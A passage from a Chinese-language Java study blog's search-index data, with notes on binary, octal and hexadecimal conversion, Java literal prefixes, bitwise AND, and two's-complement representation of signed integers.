&amp; 0011=0010 “与”运算中也是二进制位的运算，只要有一个是0那么结果就是0 java中的数据表示法 在java中数据前面加 0x表示16进制 0b表示二进制 0表示8进制 进制转换 任何进制转10进制都是 每一位 第某位的数据 乘 被转换的进制数 的 第某位索引次幂 相加 例子八转10：10120=1 * 8 ^ 2 + 2 * 8 ^ 1 + 0 * 8 ^ 0 = 80 10进制转任何进制都是 除 要转换的进制数 然后取余数，以此类推，最后得出的数据为：进制数从左到右 = 余数列表的从下到上 2、8互转与2、16互转方法： 2转8 = 3位一组转8 8转2 = 每一位转2 2转16 = 4位一组转16 16转2 = 每一位转2 二进制快速转换10进制方法： 二进制：1 1 1 1 1 1 1 1 十进制：128 64 32 16 8 4 2 1 二进制表示法: 符号位0为正，1为负 计算机二进制运算原理 计算机二进制运算都是用补码 例子： +7 的原码是 0 0000111 ps：正数的、原码、反码、补码都一样 -7 的原码为 1 0000111 反码为 1 1111000 （符号位不变） 补码为 1 1111001（在反码的基础上加1）","categories":[{"name":"JavaSE 复习","slug":"JavaSE-复习","permalink":"http://liuhaoan.github.io/categories/JavaSE-复习/"}],"tags":[{"name":"进制编码","slug":"进制编码","permalink":"http://liuhaoan.github.io/tags/进制编码/"}]}]}